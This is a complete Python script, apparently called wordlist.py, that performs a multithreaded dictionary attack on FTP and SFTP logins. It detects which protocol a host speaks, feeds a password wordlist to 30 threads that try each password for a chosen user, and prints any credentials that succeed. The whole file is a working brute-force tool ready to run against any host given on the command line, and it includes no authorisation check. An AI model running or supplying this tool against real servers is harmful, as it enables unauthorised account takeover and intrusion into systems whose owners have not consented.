import ftplib
import paramiko
from threading import Thread, Event
import queue

def print_message(message):
    print(message)

def check_ftp(host, port):
    print_message('[!] Testing FTP connection')
    try:
        server = ftplib.FTP()
        server.connect(host, port, timeout=5)
        server.quit()
        return True
    except Exception as e:
        print_message(f"[X] FTP connection failed: {e}")  # Print the specific error
        return False

def check_sftp(host, port):
    print_message('[!] Testing SFTP connection')
    try:
        transport = paramiko.Transport((host, port))
        transport.connect()  # Attempt to connect without username/password for testing
        transport.close()
        return True
    except Exception as e:
        print_message(f"[X] SFTP connection failed: {e}")  # Print the specific error
        return False

def connect_ftp(host, port, user, q, found_event):
    while not found_event.is_set():
        try:
            password = q.get_nowait()
            server = ftplib.FTP()
            server.connect(host, port, timeout=5)
            server.login(user, password)
            print_message("[+] Found FTP credentials:")
            print_message(f"\tHost: {host}")
            print_message(f"\tUser: {user}")
            print_message(f"\tPassword: {password}")
            found_event.set()
            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0
            break  # Exit the loop after finding credentials
        except (ftplib.error_perm, queue.Empty):
            pass
        except Exception as e:
            print_message(f"[X] Exception: {e}")
        finally:
            try:
                q.task_done()
            except ValueError:
                pass

def connect_sftp(host, port, user, q, found_event):
    while not found_event.is_set():
        try:
            password = q.get_nowait()
            transport = paramiko.Transport((host, port))
            transport.connect(username=user, password=password)
            sftp = paramiko.SFTPClient.from_transport(transport)
            print_message("[+] Found SFTP credentials:")
            print_message(f"\tHost: {host}")
            print_message(f"\tUser: {user}")
            print_message(f"\tPassword: {password}")
            sftp.close()
            transport.close()
            found_event.set()
            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0
            break  # Exit the loop after finding credentials
        except (paramiko.AuthenticationException, queue.Empty):
            pass
        except Exception as e:
            print_message(f"[X] Exception: {e}")
        finally:
            try:
                q.task_done()
            except ValueError:
                pass

def wordlist_attack(host, port, user, wordlist_file):
    print(f"Host: {host}, Port: {port}, User: {user}")  # Debugging line
    # Determine the protocol
    protocol = None
    if check_ftp(host, port):
        protocol = 'ftp'
    elif check_sftp(host, port):
        protocol = 'sftp'
    else:
        print_message("Unable to determine the protocol. Please try again.")
        return

    # Read the wordlist of passwords
    try:
        with open(wordlist_file, 'r') as file:
            passwords = file.read().split("\n")
        print_message("[+] Reading provided wordlist")
    except FileNotFoundError:
        print_message(f"[!] The file '{wordlist_file}' was not found. Exiting.")
        return

    # init the queue
    q = queue.Queue()
    # number of threads to spawn
    n_thread = 30

    # put all passwords into the queue
    for password in passwords:
        q.put(password)

    # Event to signal when credentials are found
    found_event = Event()

    # Print the wordlist attack start message once
    if protocol == 'ftp':
        print_message('[!] Starting FTP wordlist attack')
    elif protocol == 'sftp':
        print_message('[!] Starting SFTP wordlist attack')

    # create 'n_thread' that runs the appropriate function
    for t in range(n_thread):
        if protocol == 'ftp':
            thread = Thread(target=connect_ftp, args=(host, port, user, q, found_event))
        elif protocol == 'sftp':
            thread = Thread(target=connect_sftp, args=(host, port, user, q, found_event))
        thread.daemon = True
        thread.start()

    # wait for the queue to be empty or credentials to be found
    q.join()

    # Check if credentials were found
    if found_event.is_set():
        print_message("[!] Wordlist attack completed. Credentials found.")
    else:
        print_message("[!] Wordlist attack completed. No credentials found.")

# Only run wordlist_attack if this script is executed directly
if __name__ == "__main__":
    import sys
    if len(sys.argv) != 5:
        print("Usage: python wordlist.py <host> <port> <user> <wordlist_file>")
        sys.exit(1)
    host = sys.argv[1]
    port = int(sys.argv[2])  # Ensure this is an integer
    user = sys.argv[3]
    wordlist_file = sys.argv[4]
    wordlist_attack(host, port, user, wordlist_file)